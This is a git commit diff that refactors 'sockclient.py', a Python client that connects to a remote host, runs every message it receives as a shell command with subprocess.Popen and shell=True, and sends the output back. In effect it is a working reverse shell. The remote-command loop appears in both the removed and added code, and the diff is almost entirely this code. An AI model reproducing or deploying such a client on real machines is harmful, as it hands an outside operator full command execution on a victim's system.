816c60dac2f078ee43c3c305ea57b31a36ce2433
Alex M <sasha_midor@yahoo.com>
2023-07-08 19:10:21 -0400

    Refactor sockclient - function breakdown

--- sockclient.py
+++ sockclient.py
@@ -5,42 +5,55 @@ import os
 import sys
 
 
+def inbound_message():
+    print('[+] Listening for incoming messages...')
+    while True:
+        # message = ''
+        try:
+            message = sock.recv(1024).decode()
+            return message
+        except KeyboardInterrupt:
+            sock.close()
+            break
+        except Exception:
+            sock.close()
+            break
+
+
+def outbound_message(message):
+    response = str(message).encode()
+    sock.send(response)
+    print('[+] Reply sent...')
+
+
 def session_handler():
     print(f'[+] Connecting to {host_ip}')
     sock.connect((host_ip, host_port))
     print(f'[+] Connected to {host_ip}')
     while True:
-        try:
-            print('[+] Awaiting response...')
-            message = sock.recv(1024).decode()
-            print(f'[+] Message received - {message}')
-            if message == 'exit':
-                print('[-] The server has terminated the session.')
-                sock.close()
-                break
-
-            # Change directory script
-            elif message.split(" ")[0] == 'cd':
-                directory = str(message.split(" ")[1])
-                os.chdir(directory)
-                cur_dir = os.getcwd()
-                print(f'[+] Changed to {cur_dir}')
-                sock.send(cur_dir.encode())
-
-            # Subprocess command handling
-            else:
-                command = subprocess.Popen(
-                    message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                output = command.stdout.read() + command.stderr.read()
-                sock.send(output)
-
-        except KeyboardInterrupt:
-            print('[+] Keyboard interrupt issued')
-            sock.close
-            break
-        except Exception:
+        message = inbound_message()
+        print(f'[+] Message received - {message}')
+        if message == 'exit':
+            print('[-] The server has terminated the session.')
             sock.close()
             break
+        elif not message:
+            sock.close()
+            break
+        # Change directory script
+        elif message.split(" ")[0] == 'cd':
+            directory = str(message.split(" ")[1])
+            os.chdir(directory)
+            cur_dir = os.getcwd()
+            print(f'[+] Changed to {cur_dir}')
+            outbound_message(cur_dir)
+
+        # Subprocess command handling
+        else:
+            command = subprocess.Popen(
+                message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            output = command.stdout.read() + command.stderr.read()
+            outbound_message(output.decode())
 
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
